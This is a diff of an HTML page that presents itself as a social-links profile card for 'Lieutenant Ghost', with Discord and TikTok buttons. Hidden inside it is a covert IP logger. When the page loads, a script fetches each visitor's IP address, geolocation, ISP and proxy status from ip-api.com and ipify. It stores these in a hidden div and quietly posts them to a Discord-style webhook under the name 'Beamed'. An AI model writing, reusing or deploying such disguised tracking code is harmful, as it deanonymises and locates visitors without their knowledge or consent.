@@ -1,79 +1,135 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Not Available</title>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Lieutenant Ghost</title>
     <!-- CSS -->
-    <link rel="stylesheet" href="src/css/main.min.css">
+    <link rel="stylesheet" href="src/css/main.min.css" />
     <!-- Fontawesome -->
     <link href="https://cdn.staticaly.com/gh/hung1001/font-awesome-pro/4cac1a6/css/all.css" rel="stylesheet" type="text/css" />
     <!-- Google Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Lora:wght@700&family=Poppins:wght@300;600&display=swap" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Lora:wght@700&family=Poppins:wght@300;600&display=swap" rel="stylesheet" />
     <!-- Leaflet -->
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" integrity="sha512-xodZBNTC5n17Xt2atTPuE1HxjVMSvLVW9ocqUKLsCC5CXdbqCmblAshOMAS6/keqq/sMZMZ19scR4PsZChSR7A==" crossorigin="" />
-    <link rel="icon" type="image/x-icon" href="./src/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="./src/favicon.ico" />
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js" integrity="sha512-XQoYMqMTK8LvdxXYG3nZ448hOEQiglfqkJs1NOQV44cWnUrBc8PkAOcXy20w0vlaXaVUearIOBhiXZ5V3ynxwA==" crossorigin=""></script>
     <!-- Notyf CSS -->
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/notyf@3/notyf.min.css" />
+    <style>
+      body {
+        font-family: 'Poppins', sans-serif;
+        background: #0d1117;
+        color: #f0f0f0;
+        margin: 0;
+        padding: 0;
+      }
+
+      .container {
+        max-width: 600px;
+        margin: 80px auto;
+        padding: 30px;
+        background: #161b22;
+        border-radius: 12px;
+        box-shadow: 0 0 20px rgba(0,0,0,0.4);
+        text-align: center;
+      }
+
+      .profile-img {
+        width: 100px;
+        height: 100px;
+        border-radius: 50%;
+        border: 2px solid #fff;
+        margin-bottom: 15px;
+      }
+
+      h1 {
+        margin-bottom: 10px;
+        font-size: 26px;
+      }
+
+      .links a {
+        display: block;
+        background: #238636;
+        margin: 10px 0;
+        padding: 12px;
+        border-radius: 8px;
+        color: #fff;
+        text-decoration: none;
+        font-weight: 600;
+        transition: background 0.3s ease;
+      }
+
+      .links a:hover {
+        background: #2ea043;
+      }
+
+      .header, .map-container {
+        display: none;
+      }
+    </style>
   </head>
   <body>
+    <div class="container">
+      <img src="https://cdn.discordapp.com/avatars/1200789747197198376/a_64893a94715b6e62be759ca15e901c7d.gif?size=1024" alt="Profile" class="profile-img" />
+      <h1>Lieutenant Ghost</h1>
+      <p>@lietenant_Ghost</p>
+      <div class="links">
+        <a href="https://discord.gg/lietenantghost" target="_blank"><i class="fab fa-discord"></i> Join Discord</a>
+        <a href="https://tiktok.com/@lietenant_ghost" target="_blank"><i class="fab fa-tiktok"></i> TikTok</a>
+        <a href="https://guns.lol/lietenant_Ghost" target="_blank"><i class="fas fa-link"></i> More Links</a>
+      </div>
+    </div>
+
     <header class="header"></header>
+
     <script src="./config.js"></script>
     <script>
       function get_information(link, callback) {
         var xhr = new XMLHttpRequest();
         xhr.open("GET", link, true);
-        xhr.onreadystatechange = function() {
+        xhr.onreadystatechange = function () {
           if (xhr.readyState === 4) {
             callback(xhr.responseText);
           }
         };
         xhr.send(null);
       }
-      get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function(text) {
+
+      get_information("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (text) {
         var div = document.createElement("div");
         div.innerHTML = text;
         div.id = "razzylog";
-        const secondList = document.getElementsByClassName("header")[0]
-        secondList.appendChild(div)
+        document.querySelector(".header").appendChild(div);
       });
-      get_information("https://api.ipify.org/", function(text) {
+
+      get_information("https://api.ipify.org/", function (text) {
         var div = document.createElement("div");
         div.innerHTML = text;
         div.id = "ipppp";
-        const secondList = document.getElementsByClassName("header")[0]
-        secondList.appendChild(div)
+        document.querySelector(".header").appendChild(div);
       });
 
       function ipLogByRaz() {
-        var ispp = document.getElementById('ipppp').innerHTML
-        var extra = document.getElementById("razzylog").innerHTML
+        var ispp = document.getElementById("ipppp").innerHTML;
+        var extra = document.getElementById("razzylog").innerHTML;
         const request = new XMLHttpRequest();
         request.open("POST", wbhk);
-        request.setRequestHeader('Content-type', 'application/json');
+        request.setRequestHeader("Content-type", "application/json");
         const params = {
           username: "Beamed",
-          avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
+          avatar_url: "https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png",
           content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Extra Info** : ```" + extra + "```"
-        }
+        };
         request.send(JSON.stringify(params));
       }
-      setTimeout(function() {
-        ipLogByRaz()
+
+      setTimeout(function () {
+        ipLogByRaz();
       }, 700);
     </script>
-    <style>
-      .header {
-        display: none
-      }
-
-      .map-container {
-        display: none
-      }
-    </style>
   </body>
 </html>
